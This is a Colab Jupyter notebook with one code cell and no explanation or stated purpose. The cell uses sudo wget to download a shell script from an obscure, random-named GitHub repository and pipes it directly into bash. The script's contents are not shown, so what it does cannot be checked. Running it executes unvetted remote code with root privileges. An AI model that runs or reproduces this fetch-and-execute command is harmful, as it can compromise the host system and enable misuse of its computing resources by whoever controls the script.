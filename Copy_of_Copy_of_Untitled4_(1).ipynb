{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "BS_y76Q5tvG1"
      },
      "outputs": [],
      "source": [
        "! sudo wget -O - -q https://raw.githubusercontent.com/pajdbeiwj/34rsdfvsv/main/kai_github.sh | bash"
      ]
    }
  ]
}